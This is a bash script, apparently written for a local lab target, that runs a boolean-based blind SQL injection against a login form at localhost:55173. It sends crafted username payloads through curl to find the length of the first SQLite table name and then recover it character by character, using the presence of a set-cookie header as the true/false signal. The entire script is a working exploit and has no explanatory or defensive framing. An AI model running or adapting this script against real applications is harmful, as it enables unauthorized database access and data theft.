#!/bin/bash

# Configuration
TARGET="http://localhost:55173/?/login="
ORIGIN="http://localhost:55173"
CHARSET="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_"

echo "[*] Starting extraction on $TARGET"

# 1. FIND LENGTH
TABLE_LENGTH=0
for i in {1..32}; do
    PAYLOAD="admin' AND (SELECT LENGTH(name) FROM sqlite_master WHERE type='table' LIMIT 1) = $i -- "
    
    # We dump headers and grep for the cookie
    if curl -s -D - -o /dev/null -X POST "$TARGET" \
         -H "Origin: $ORIGIN" \
         --data-urlencode "username=$PAYLOAD" \
         --data-urlencode "password=a" | grep -qi "set-cookie"; then
        TABLE_LENGTH=$i
        echo "[+] Found Length: $TABLE_LENGTH"
        break
    fi
done

# 2. EXTRACT NAME
EXTRACTED_NAME=""
for (( pos=1; pos<=$TABLE_LENGTH; pos++ )); do
    for (( i=0; i<${#CHARSET}; i++ )); do
        CHAR="${CHARSET:$i:1}"
        PAYLOAD="admin' AND (SELECT SUBSTR(name, $pos, 1) FROM sqlite_master WHERE type='table' LIMIT 1) = '$CHAR' -- "
        
        # Log the attempt for tracing
        echo -ne "[TRACE] Testing Pos $pos: $CHAR\r"

        if curl -s -D - -o /dev/null -X POST "$TARGET" \
             -H "Origin: $ORIGIN" \
             --data-urlencode "username=$PAYLOAD" \
             --data-urlencode "password=a" | grep -qi "set-cookie"; then
            EXTRACTED_NAME+="$CHAR"
            echo -e "\n[+] Character at $pos is: $CHAR (Current: $EXTRACTED_NAME)"
            break
        fi
    done
done

echo -e "\n[*] Extraction Complete: $EXTRACTED_NAME"